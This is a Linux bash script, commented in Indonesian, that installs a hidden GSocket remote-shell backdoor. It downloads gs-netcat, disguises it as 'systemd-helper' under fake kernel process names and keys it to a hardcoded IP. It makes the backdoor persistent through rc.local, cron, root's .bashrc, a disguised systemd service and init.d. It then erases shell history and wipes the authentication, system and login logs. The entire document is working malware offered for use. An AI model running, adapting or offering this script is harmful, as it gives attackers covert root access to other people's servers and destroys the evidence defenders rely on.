#!/bin/bash
# ============================================================
# GSOCKET BACKDOOR ONLY - HIDDEN PERSISTENCE (FIXED)
# ============================================================

VPS_IP=\$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print \$1}')
GSOCKET_SECRET="\${VPS_IP}@dark-ai"

HIDDEN_DIR="/usr/share/man/.cache"
BINARY_NAME="systemd-helper"
GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"

PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")

echo "=========================================="
echo " GSOCKET BACKDOOR INSTALLER - FIXED"
echo "=========================================="

# ============================================================
# 1. GSOCKET HIDDEN
# ============================================================
mkdir -p "\$HIDDEN_DIR" 2>/dev/null
chmod 755 "\$HIDDEN_DIR" 2>/dev/null

if [ ! -f "\$GS_NETCAT" ]; then
    echo "Mengunduh GSocket binary..."
    # Coba beberapa URL fallback
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O "\$GS_NETCAT" 2>/dev/null || \
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "\$GS_NETCAT" 2>/dev/null || \
    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -O "\$GS_NETCAT" 2>/dev/null || \
    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -o "\$GS_NETCAT" 2>/dev/null || \
    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "\$GS_NETCAT" 2>/dev/null || \
    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -o "\$GS_NETCAT" 2>/dev/null
    
    if [ -f "\$GS_NETCAT" ]; then
        chmod +x "\$GS_NETCAT"
        echo "GSocket binary berhasil diunduh"
    else
        echo "Gagal mengunduh GSocket binary"
        exit 1
    fi
else
    echo "GSocket binary sudah ada"
fi
chattr +i "\$GS_NETCAT" 2>/dev/null

# ============================================================
# 2. BUAT SCRIPT LAUNCHER TERSEMBUNYI
# ============================================================
# Buat script launcher yang akan menjalankan GSocket tanpa output
cat > "\$HIDDEN_DIR/.launch" << 'EOF'
#!/bin/bash
# Script launcher tersembunyi untuk GSocket
# Tidak menghasilkan output apapun

# Hentikan proses lama jika ada
pkill -f "systemd-helper" 2>/dev/null

# Jalankan GSocket dengan nama proses acak
PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % \${#PROCESS_NAMES[@]}))]}"

# Jalankan tanpa output
exec -a "\$PROCESS_NAME" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD 2>/dev/null &
EOF

chmod +x "\$HIDDEN_DIR/.launch"
chattr +i "\$HIDDEN_DIR/.launch" 2>/dev/null

# ============================================================
# 3. MENJALANKAN GSOCKET
# ============================================================
echo "Menjalankan GSocket..."
# Hentikan proses lama jika ada
pkill -f "\$BINARY_NAME" 2>/dev/null

# Jalankan proses baru tanpa output
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % \${#PROCESS_NAMES[@]}))]}"
exec -a "$PROCESS_NAME" "$GS_NETCAT" -s "\$GSOCKET_SECRET" -liqD 2>/dev/null &

# Verifikasi proses berjalan
sleep 2
if pgrep -f "\$BINARY_NAME" > /dev/null; then
    echo "GSocket berhasil dijalankan"
else
    echo "Gagal menjalankan GSocket"
fi

# ============================================================
# 4. PERSISTENCE (DIPERBAIKI - TANPA OUTPUT)
# ============================================================
echo "Mengatur persistence..."

# Metode 1: rc.local
if [ -f /etc/rc.local ]; then
    grep -q "\$BINARY_NAME" /etc/rc.local 2>/dev/null || \
    sed -i '/^exit 0/i\bash -c "exec -a \"[kworker]\" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD" &>/dev/null &' /etc/rc.local 2>/dev/null
fi

# Metode 2: crontab dengan redirect output ke /dev/null
(crontab -l 2>/dev/null | grep -v "\$BINARY_NAME"; echo "@reboot bash -c \"exec -a '[kworker]' /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD\" &>/dev/null &") | crontab -
(crontab -l 2>/dev/null | grep -v "\$BINARY_NAME"; echo "*/5 * * * * pgrep -f systemd-helper >/dev/null 2>&1 || bash -c \"exec -a '[kworker]' /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD\" &>/dev/null &") | crontab -

# Metode 3: bashrc dengan redirect output ke /dev/null
sed -i '/systemd-helper/d' /root/.bashrc 2>/dev/null
echo 'pgrep -f systemd-helper >/dev/null 2>&1 || bash -c "exec -a \"[kworker]\" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD" &>/dev/null &' >> /root/.bashrc

# Metode 4: systemd
if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/systemd-helper.service << SYSTEMD_EOF
[Unit]
Description=System Helper Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD
Restart=always
RestartSec=5
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-helper 2>/dev/null
    systemctl start systemd-helper 2>/dev/null
fi

# Metode 5: init.d
cat > /etc/init.d/systemd-helper << INIT_EOF
#!/bin/bash
case "\$1" in
    start) exec -a "[kworker]" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD >/dev/null 2>&1 & ;;
    stop) pkill -f "systemd-helper" ;;
esac
INIT_EOF
chmod +x /etc/init.d/systemd-helper
chkconfig systemd-helper on 2>/dev/null || update-rc.d systemd-helper defaults 2>/dev/null

# ============================================================
# 5. HAPUS JEJAK
# ============================================================
echo "Menghapus jejak..."

# Hapus history
history -c 2>/dev/null
rm -f /root/.bash_history 2>/dev/null
unset HISTFILE 2>/dev/null

# Bersihkan log yang mungkin mencatat aktivitas
> /var/log/secure 2>/dev/null
> /var/log/auth.log 2>/dev/null
> /var/log/messages 2>/dev/null
> /var/log/syslog 2>/dev/null

# Bersihkan wtmp/lastlog
> /var/log/wtmp 2>/dev/null
> /var/log/lastlog 2>/dev/null
> /var/log/btmp 2>/dev/null

# Bersihkan temp
rm -rf /tmp/.*.log /tmp/install* /tmp/setup* 2>/dev/null

echo ""
echo "Instalasi selesai!"
echo ""
echo "=========================================="
echo " CONNECT:"
echo "  Gsock : gs-netcat -s $GSOCKET_SECRET -i"
echo "=========================================="
